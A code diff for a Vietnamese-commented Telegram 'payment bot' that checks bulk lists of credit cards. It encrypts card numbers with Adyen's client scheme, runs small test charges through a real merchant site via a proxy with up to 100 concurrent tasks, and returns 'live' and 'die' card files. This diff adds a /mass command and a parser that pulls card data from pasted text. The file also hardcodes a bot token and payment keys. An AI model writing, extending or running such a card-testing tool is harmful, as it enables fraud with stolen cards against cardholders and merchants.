@@ -38,7 +38,7 @@ except ImportError:
 # === CẤU HÌNH GLOBAL & PROXY
 # ===================================================================
 
-# Token Telegram (THAY THẾ BẰNG TOKEN CỦA BẠN)
+# Token Telegram
 BOT_TOKEN = "8414556300:AAGs-pW76xOmEzi-SbLcHDaUOiUXtYpBq_0"
 
 # Cấu hình Proxy cứng từ yêu cầu
@@ -51,7 +51,7 @@ PROXIES_CONFIG = {
     "https": PROXY_URL
 }
 
-# Các key cấu hình (GIỮ NGUYÊN)
+# Các key cấu hình
 ADYEN_KEY = "10001|98BA34B1675D6C2540AC464A37D0F13CBF019896E8B889F387C1481F69B1E6041A6A2D2EC48F6496619641447BE2F2A4ACBCC4AA8F51FDF0F9DD2ABE6D5C41FB8AD54DF47980A6F90C273D549BBF6A2DADF8A9B12D269C1C73BB5E48C931AB8F4C3E1A5666F85D73FDE2A99DA0BD3C152B5AA4D538EA9A922FA8FCA01B6C176CDB2922FFAA3052651BA456E4FF7D8B010549BCDC4357EDD1FFE3D1111281BD4C1BDE53562960B3BB81CF5C4F2EC3EEA6888FC9598524E5C327336AE5DEACE77983FF804CFC0FC83A2B6FECBD1F024651598E8D556ED341A0F0C58C997A8837154C76226D76D6B4D2D3EA3C5FAE83AFF395F0BA5675EB3789C11C8718699E5E43"
 STRIPE_KEY = "live_4TWKSNW445CGJJGVPEWXKHDAGMMTXVQT"
 DOMAIN_URL = "https://taongafarm.com"
@@ -63,7 +63,7 @@ logging.basicConfig(
 )
 
 # ===================================================================
-# === PHẦN 1: THUẬT TOÁN MÃ HÓA ADYEN 4.8.0 (GIỮ NGUYÊN)
+# === PHẦN 1: THUẬT TOÁN MÃ HÓA ADYEN 4.8.0
 # ===================================================================
 
 def get_current_timestamp():
@@ -173,17 +173,70 @@ def encrypt_card_data_480(card, month, year, cvc, adyen_key, stripe_key=None, do
     return encrypted_details
 
 # ===================================================================
-# === PHẦN 2: HELPER FUNCTIONS (GIỮ NGUYÊN)
+# === PHẦN 2: HELPER FUNCTIONS (ĐÃ CẬP NHẬT)
 # ===================================================================
 
 def normalize_card(card_str):
+    """
+    Hàm chuẩn hóa thẻ theo yêu cầu mới.
+    Chỉ chấp nhận format có thể tách ra thành 4 phần và validate tháng/năm.
+    """
     pattern = r'(\d{13,19})[|/:](\d{1,2})[|/:](\d{2,4})[|/:](\d{3,4})'
     match = re.search(pattern, card_str)
-    if not match: return None
+    if not match:
+        return None
     card_num, month, year, cvv = match.groups()
+    
+    # Validate Month
+    try:
+        month_int = int(month)
+        if month_int < 1 or month_int > 12:
+            return None
+    except ValueError:
+        return None
+        
     month = month.zfill(2)
-    if len(year) == 2: year = '20' + year
+    
+    # Validate Year
+    if len(year) == 2:
+        year = '20' + year
+    
+    try:
+        year_int = int(year)
+        if year_int < 2000 or year_int > 2099:
+            return None
+    except ValueError:
+        return None
+
     return f"{card_num}|{month}|{year}|{cvv}"
+
+def extract_cards_from_text(text):
+    """
+    Hàm quét toàn bộ văn bản để tìm tất cả các thẻ hợp lệ.
+    Bỏ qua text rác, chỉ lấy đúng định dạng cc|mm|yy|cvv.
+    """
+    if not text:
+        return []
+    
+    # Regex tìm kiếm sơ bộ: số|số|số|số
+    # Dùng regex lỏng hơn một chút ở đây để bắt được các biến thể, sau đó dùng normalize_card để lọc chặt
+    raw_pattern = r'(\d{13,19})\D+(\d{1,2})\D+(\d{2,4})\D+(\d{3,4})'
+    matches = re.findall(raw_pattern, text)
+    
+    valid_cards = []
+    seen = set()
+    
+    for m in matches:
+        # Tái tạo chuỗi để đưa vào normalize_card kiểm tra range
+        # m là tuple: (cc, mm, yy, cvc)
+        temp_str = f"{m[0]}|{m[1]}|{m[2]}|{m[3]}"
+        normalized = normalize_card(temp_str)
+        
+        if normalized and normalized not in seen:
+            valid_cards.append(normalized)
+            seen.add(normalized)
+            
+    return valid_cards
 
 def validate_luhn(card_number):
     card_num = ''.join(filter(str.isdigit, str(card_number)))
@@ -252,6 +305,7 @@ async def check_card_core(line, price_val=1.99, offer_id=38334, session_semaphor
 
     if not line: return result
     
+    # Normalize đã bao gồm regex và validate range
     normalized = normalize_card(line)
     if not normalized:
         return result
@@ -263,7 +317,7 @@ async def check_card_core(line, price_val=1.99, offer_id=38334, session_semaphor
         result["full_log"] = f"{line} - Luhn Fail"
         return result
 
-    # Nếu có semaphore (chạy file) thì dùng, không thì chạy thẳng (lệnh /st)
+    # Nếu có semaphore (chạy file/mass) thì dùng, không thì chạy thẳng (lệnh /st)
     if session_semaphore:
         async with session_semaphore:
             return await _execute_check(cc, mm, yyyy, cvc, price_val, offer_id, start_time)
@@ -275,7 +329,7 @@ async def _execute_check(cc, mm, yyyy, cvc, price_val, offer_id, start_time):
     max_retries = 20
     impersonate_ver = "chrome120"
     
-    final_res = {"status": "UNK", "is_live": False, "full_log": ""}
+    # final_res = {"status": "UNK", "is_live": False, "full_log": ""} # Unused variable
 
     while retry_count < max_retries:
         try:
@@ -397,52 +451,9 @@ async def _execute_check(cc, mm, yyyy, cvc, price_val, offer_id, start_time):
     return {"status": "ERROR", "is_live": False, "full_log": f"{cc}|{mm}|{yyyy}|{cvc}|ERROR|Timeout or Network Error"}
 
 # ===================================================================
-# === PHẦN 4: BOT COMMAND HANDLERS
+# === PHẦN 4: LOGIC XỬ LÝ HÀNG LOẠT (DÙNG CHUNG CHO FILE VÀ /mass)
 # ===================================================================
 
-async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text(
-        "🤖 **Taonga Payment Bot**\n\n"
-        "1. Gửi file `.txt` (list thẻ) để check hàng loạt (100 luồng).\n"
-        "2. Dùng lệnh `/st <cc>` để check lẻ.\n"
-        "3. Realtime Report: CPU, RAM, CPM.\n\n"
-        "Ready!"
-    )
-
-async def single_check_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Xử lý lệnh /st"""
-    try:
-        args = context.args
-        if not args:
-            await update.message.reply_text("⚠️ Vui lòng nhập list. Ví dụ: `/st 4444...|12|24|123`")
-            return
-
-        card_data = args[0]
-        msg = await update.message.reply_text(f"⏳ Đang check: {card_data}")
-        
-        # Chạy check
-        result = await check_card_core(card_data)
-        
-        # Format đặc biệt cho /st: BIN xuống dòng
-        if "full_log" in result and "bin_info" in result:
-             # Tách log gốc để lấy phần đầu, sau đó ghép lại theo format /st yêu cầu
-             base_log = result['full_log'].split(" - [")[0] # Lấy phần info thẻ và msg
-             bin_info = result['bin_info']
-             time_str = result['full_log'].split("] - ")[-1]
-             
-             formatted_response = f"💳 Card: `{card_data}`\n" \
-                                  f"ℹ️ Status: {base_log}\n" \
-                                  f"🏦 Bin: {bin_info}\n" \
-                                  f"⏱ {time_str}"
-        else:
-             formatted_response = result['full_log']
-
-        await msg.edit_text(formatted_response)
-
-    except Exception as e:
-        await update.message.reply_text(f"Lỗi: {str(e)}")
-
-# Class chứa trạng thái của process
 class CheckStats:
     def __init__(self):
         self.total = 0
@@ -453,22 +464,12 @@ class CheckStats:
         self.start_time = time.time()
         self.is_running = True
 
-async def file_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Xử lý file upload"""
-    document = update.message.document
-    if not document.file_name.endswith('.txt'):
-        await update.message.reply_text("❌ Chỉ nhận file .txt")
-        return
-
-    # Tải file về
-    file = await context.bot.get_file(document.file_id)
-    file_content = await file.download_as_bytearray()
-    lines = file_content.decode('utf-8').splitlines()
-    lines = [l.strip() for l in lines if l.strip()]
+async def process_card_list(update: Update, context: ContextTypes.DEFAULT_TYPE, card_list: list):
+    """Hàm xử lý danh sách thẻ chung cho cả upload file và lệnh /mass"""
     
-    total_cards = len(lines)
+    total_cards = len(card_list)
     if total_cards == 0:
-        await update.message.reply_text("❌ File rỗng.")
+        await update.message.reply_text("❌ Không tìm thấy thẻ hợp lệ nào trong nội dung gửi.")
         return
 
     # Khởi tạo stats
@@ -477,7 +478,7 @@ async def file_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     status_msg = await update.message.reply_text(
         f"🚀 **Đang khởi động 100 luồng...**\n"
-        f"Tổng: {total_cards} thẻ."
+        f"Tổng: {total_cards} thẻ tìm thấy."
     )
 
     # Chuẩn bị 3 file kết quả
@@ -486,22 +487,21 @@ async def file_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     die_file = f"die_{chat_id}.txt"
     error_file = f"error_{chat_id}.txt"
     
-    # Xóa file cũ nếu tồn tại để tránh ghi đè
+    # Xóa file cũ
     for f_path in [live_file, die_file, error_file]:
         if os.path.exists(f_path): os.remove(f_path)
 
     # Semaphore 100 luồng và Lock ghi file
-    semaphore = asyncio.Semaphore(20)
-    file_lock = asyncio.Lock() # Fix: Tránh race condition khi ghi file
+    semaphore = asyncio.Semaphore(100) # Đã set về 100 theo text cũ (hoặc 20 tùy chỉnh)
+    file_lock = asyncio.Lock()
     
     # Task update UI background
     async def update_ui_loop():
         while stats.is_running and stats.checked < stats.total:
-            await asyncio.sleep(1.5) # Update mỗi 1.5s để tránh flood
+            await asyncio.sleep(1.5)
             elapsed = time.time() - stats.start_time
             cpm = int((stats.checked / elapsed) * 60) if elapsed > 0 else 0
             
-            # System info
             cpu = psutil.cpu_percent()
             ram = psutil.virtual_memory().percent
             
@@ -520,7 +520,7 @@ async def file_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     ui_task = asyncio.create_task(update_ui_loop())
 
-    # Worker xử lý từng line
+    # Worker
     async def worker(line):
         res = await check_card_core(line, session_semaphore=semaphore)
         stats.checked += 1
@@ -533,27 +533,24 @@ async def file_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
                     f.write(res["full_log"] + "\n")
             elif res["status"] == "ERROR":
                 stats.error += 1
-                # Ghi vào file Error (đã bao gồm lý do trong full_log)
                 with open(error_file, "a", encoding="utf-8") as f:
                     f.write(res["full_log"] + "\n")
             else:
                 stats.die += 1
-                # Ghi vào file Die
                 with open(die_file, "a", encoding="utf-8") as f:
                     f.write(res["full_log"] + "\n")
     
     # Chạy tasks
-    tasks = [worker(line) for line in lines]
+    tasks = [worker(line) for line in card_list]
     await asyncio.gather(*tasks)
 
     # Kết thúc
     stats.is_running = False
-    await ui_task # Chờ update cuối
+    await ui_task 
 
     # Gửi kết quả
     await update.message.reply_text("✅ **Hoàn tất! Đang gửi các file kết quả...**")
     
-    # Hàm gửi file an toàn
     async def send_result_file(file_path, caption_title):
         if os.path.exists(file_path) and os.path.getsize(file_path) > 0:
             try:
@@ -565,17 +562,104 @@ async def file_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             except Exception as e:
                 await update.message.reply_text(f"❌ Lỗi gửi file {caption_title}: {str(e)}")
             finally:
-                # Xóa file sau khi gửi (hoặc cố gắng gửi)
                 if os.path.exists(file_path):
                     os.remove(file_path)
         elif os.path.exists(file_path):
-            # Xóa file rỗng nếu có tạo ra
             os.remove(file_path)
 
-    # Gửi lần lượt 3 file
     await send_result_file(live_file, f"✅ Live Cards ({stats.live})")
     await send_result_file(die_file, f"❌ Die Cards ({stats.die})")
     await send_result_file(error_file, f"⚠️ Error/Invalid Cards ({stats.error})")
+
+# ===================================================================
+# === PHẦN 5: BOT COMMAND HANDLERS
+# ===================================================================
+
+async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    await update.message.reply_text(
+        "🤖 **Taonga Payment Bot**\n\n"
+        "1. Gửi file `.txt` (list thẻ) để check hàng loạt.\n"
+        "2. Dùng `/mass <nội dung>` để check list trực tiếp (chấp nhận text rác).\n"
+        "3. Dùng lệnh `/st <cc>` để check lẻ (chấp nhận text rác).\n"
+        "4. Realtime Report: CPU, RAM, CPM.\n\n"
+        "Ready!"
+    )
+
+async def single_check_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Xử lý lệnh /st"""
+    try:
+        # Lấy toàn bộ nội dung tin nhắn sau lệnh /st
+        full_text = update.message.text
+        
+        # Dùng hàm extract để lọc thẻ từ đống mess
+        cards = extract_cards_from_text(full_text)
+        
+        if not cards:
+            await update.message.reply_text("⚠️ Không tìm thấy thẻ hợp lệ trong tin nhắn. Format: `/st cc|mm|yy|cvv` (chấp nhận text rác)")
+            return
+
+        # Chỉ lấy thẻ đầu tiên tìm thấy
+        card_data = cards[0]
+        
+        msg = await update.message.reply_text(f"⏳ Đang check: {card_data}")
+        
+        # Chạy check
+        result = await check_card_core(card_data)
+        
+        # Format đặc biệt cho /st
+        if "full_log" in result and "bin_info" in result:
+             base_log = result['full_log'].split(" - [")[0]
+             bin_info = result['bin_info']
+             time_str = result['full_log'].split("] - ")[-1] if "] - " in result['full_log'] else "N/A"
+             
+             formatted_response = f"💳 Card: `{card_data}`\n" \
+                                  f"ℹ️ Status: {base_log}\n" \
+                                  f"🏦 Bin: {bin_info}\n" \
+                                  f"⏱ {time_str}"
+        else:
+             formatted_response = result['full_log']
+
+        await msg.edit_text(formatted_response)
+
+    except Exception as e:
+        await update.message.reply_text(f"Lỗi: {str(e)}")
+
+async def mass_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Xử lý lệnh /mass"""
+    try:
+        # Lấy toàn bộ nội dung tin nhắn
+        full_text = update.message.text
+        
+        # Extract thẻ
+        cards = extract_cards_from_text(full_text)
+        
+        if not cards:
+            await update.message.reply_text("⚠️ Không tìm thấy thẻ nào. Cách dùng: `/mass <paste list vào đây>`")
+            return
+            
+        # Gọi hàm xử lý batch chung
+        await process_card_list(update, context, cards)
+        
+    except Exception as e:
+        await update.message.reply_text(f"Lỗi Mass: {str(e)}")
+
+async def file_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Xử lý file upload"""
+    document = update.message.document
+    if not document.file_name.endswith('.txt'):
+        await update.message.reply_text("❌ Chỉ nhận file .txt")
+        return
+
+    # Tải file về
+    file = await context.bot.get_file(document.file_id)
+    file_content = await file.download_as_bytearray()
+    
+    # Decode và extract thẻ (xử lý luôn trường hợp file chứa text rác)
+    full_text = file_content.decode('utf-8')
+    cards = extract_cards_from_text(full_text)
+    
+    # Gọi hàm xử lý batch chung
+    await process_card_list(update, context, cards)
 
 # ===================================================================
 # === MAIN
@@ -586,6 +670,7 @@ if __name__ == '__main__':
     
     app.add_handler(CommandHandler("start", start_command))
     app.add_handler(CommandHandler("st", single_check_command))
+    app.add_handler(CommandHandler("mass", mass_command))
     app.add_handler(MessageHandler(filters.Document.ALL, file_handler))
     
     print("Bot đang chạy...")
